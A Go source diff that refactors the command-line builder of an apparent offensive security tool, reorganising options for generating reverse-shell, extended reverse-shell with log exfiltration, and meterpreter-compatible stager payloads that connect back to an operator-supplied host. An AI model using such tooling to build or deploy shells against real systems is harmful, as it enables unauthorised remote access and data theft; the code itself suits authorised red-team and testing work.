@@ -8,13 +8,18 @@ import (
 	"github.com/spf13/cobra"
 )
 
-var opts struct {
+type BuildOpts struct {
+	Arch         string
+	OS           string
+	Output       string
+	NoWindowsGui bool
+}
+
+var buildOpts BuildOpts
+
+var payloadVars struct {
 	address        string
 	net            string
-	arch           string
-	os             string
-	output         string
-	noWindowsGui   bool
 	verbose        bool
 	exfilCfg       string
 	exfilTimeout   time.Duration
@@ -32,27 +37,16 @@ var reverseShellCmd = &cobra.Command{
 	Short: "simple reverse shell",
 	Run: func(cmd *cobra.Command, args []string) {
 		verbose := "false"
-		if opts.verbose {
+		if payloadVars.verbose {
 			verbose = "true"
 		}
 
-		regular := regularLDFlags{"w": "", "s": ""}
-		if opts.os == "windows" && !opts.noWindowsGui {
-			regular["H"] = "windowsgui"
-		}
-		externalVars := externalVarLDFlags{
-			"address": opts.address,
-			"network": opts.net,
+		err := build("rsh", injectedVariables{
+			"address": payloadVars.address,
+			"network": payloadVars.net,
 			"verbose": verbose,
-			"shell":   opts.preferredShell,
-		}
-
-		err := build([]string{
-			"-trimpath",
-			"-ldflags", setupLDFlags(regular, externalVars),
-			"-o", outputFileName("xrsh"),
-			"./payloads/rsh",
-		})
+			"shell":   payloadVars.preferredShell,
+		}, buildOpts)
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -63,30 +57,13 @@ var extendedReverseShellCmd = &cobra.Command{
 	Use:   "xrsh",
 	Short: "extended robust reverse shell",
 	Run: func(cmd *cobra.Command, args []string) {
-		noWindowsGui := "false"
-		if opts.noWindowsGui {
-			noWindowsGui = "true"
-		}
-
-		regular := regularLDFlags{"w": "", "s": ""}
-		if opts.os == "windows" && !opts.noWindowsGui {
-			regular["H"] = "windowsgui"
-		}
-		externalVars := externalVarLDFlags{
-			"address":      opts.address,
-			"network":      opts.net,
-			"exfilCfg":     opts.exfilCfg,
-			"exfilTimeout": opts.exfilTimeout.String(),
-			"noWindowsGui": noWindowsGui,
-			"shell":        opts.preferredShell,
-		}
-
-		err := build([]string{
-			"-trimpath",
-			"-ldflags", setupLDFlags(regular, externalVars),
-			"-o", outputFileName("xrsh"),
-			"./payloads/xrsh",
-		})
+		err := build("xrsh", injectedVariables{
+			"address":      payloadVars.address,
+			"network":      payloadVars.net,
+			"exfilCfg":     payloadVars.exfilCfg,
+			"exfilTimeout": payloadVars.exfilTimeout.String(),
+			"shell":        payloadVars.preferredShell,
+		}, buildOpts)
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -97,23 +74,12 @@ var stagerCmd = &cobra.Command{
 	Use:   "stager",
 	Short: "meterpreter/reverse_tcp compatible shellcode stager",
 	Run: func(cmd *cobra.Command, args []string) {
-		regular := regularLDFlags{"w": "", "s": ""}
-		if opts.os == "windows" && !opts.noWindowsGui {
-			regular["H"] = "windowsgui"
-		}
-		externalVars := externalVarLDFlags{
-			"address":      opts.address,
-			"network":      opts.net,
-			"exfilCfg":     opts.exfilCfg,
-			"exfilTimeout": opts.exfilTimeout.String(),
-		}
-
-		err := build([]string{
-			"-trimpath",
-			"-ldflags", setupLDFlags(regular, externalVars),
-			"-o", outputFileName("stager"),
-			"./payloads/stager",
-		})
+		err := build("stager", injectedVariables{
+			"address":      payloadVars.address,
+			"network":      payloadVars.net,
+			"exfilCfg":     payloadVars.exfilCfg,
+			"exfilTimeout": payloadVars.exfilTimeout.String(),
+		}, buildOpts)
 		if err != nil {
 			fmt.Println(err)
 		}
@@ -121,25 +87,30 @@ var stagerCmd = &cobra.Command{
 }
 
 func init() {
-	payloadCmd.PersistentFlags().StringVarP(&opts.address, "destination", "d", "",
+	payloadCmd.PersistentFlags().StringVarP(&payloadVars.address, "destination", "d", "",
 		"connect-back destination, like LHOST (host:port)")
-	payloadCmd.PersistentFlags().StringVarP(&opts.net, "network", "n", "tcp", "dial network")
-	payloadCmd.PersistentFlags().StringVar(&opts.arch, "arch", runtime.GOARCH, "target architecture")
-	payloadCmd.PersistentFlags().StringVar(&opts.os, "os", runtime.GOOS, "target operating system")
-	payloadCmd.PersistentFlags().StringVarP(&opts.output, "output", "o", "", "target operating system")
-	payloadCmd.PersistentFlags().BoolVar(&opts.noWindowsGui, "nowindowsgui", false, "don't use -H=windowsgui")
+	payloadCmd.PersistentFlags().StringVarP(&payloadVars.net, "network", "n", "tcp", "dial network")
+	payloadCmd.PersistentFlags().StringVar(&buildOpts.Arch, "arch", runtime.GOARCH, "target architecture")
+	payloadCmd.PersistentFlags().StringVar(&buildOpts.OS, "os", runtime.GOOS, "target operating system")
+	payloadCmd.PersistentFlags().StringVarP(&buildOpts.Output, "output", "o", "", "target operating system")
+	payloadCmd.PersistentFlags().BoolVar(&buildOpts.NoWindowsGui, "nowindowsgui", false,
+		"don't use -H=windowsgui")
 
 	_ = payloadCmd.MarkPersistentFlagRequired("destination")
 
-	reverseShellCmd.PersistentFlags().BoolVar(&opts.verbose, "verbose", false, "print errors to stderr")
-	reverseShellCmd.PersistentFlags().StringVar(&opts.preferredShell, "shell", "", "preferred shell")
+	reverseShellCmd.PersistentFlags().BoolVar(&payloadVars.verbose, "verbose", false, "print errors to stderr")
+	reverseShellCmd.PersistentFlags().StringVar(&payloadVars.preferredShell, "shell", "", "preferred shell")
 
-	extendedReverseShellCmd.PersistentFlags().StringVarP(&opts.exfilCfg, "exfil", "e", "", "log exfil configuration")
-	extendedReverseShellCmd.PersistentFlags().DurationVar(&opts.exfilTimeout, "timeout", 3*time.Second, "exfil timeout")
-	extendedReverseShellCmd.PersistentFlags().StringVar(&opts.preferredShell, "shell", "", "preferred shell")
+	extendedReverseShellCmd.PersistentFlags().StringVarP(&payloadVars.exfilCfg, "exfil", "e", "",
+		"log exfil configuration")
+	extendedReverseShellCmd.PersistentFlags().DurationVar(&payloadVars.exfilTimeout, "timeout", 3*time.Second,
+		"exfil timeout")
+	extendedReverseShellCmd.PersistentFlags().StringVar(&payloadVars.preferredShell, "shell", "",
+		"preferred shell")
 
-	stagerCmd.PersistentFlags().StringVarP(&opts.exfilCfg, "exfil", "e", "", "log exfil configuration")
-	stagerCmd.PersistentFlags().DurationVar(&opts.exfilTimeout, "timeout", 3*time.Second, "exfil timeout")
+	stagerCmd.PersistentFlags().StringVarP(&payloadVars.exfilCfg, "exfil", "e", "", "log exfil configuration")
+	stagerCmd.PersistentFlags().DurationVar(&payloadVars.exfilTimeout, "timeout", 3*time.Second,
+		"exfil timeout")
 
 	payloadCmd.AddCommand(reverseShellCmd)
 	payloadCmd.AddCommand(extendedReverseShellCmd)
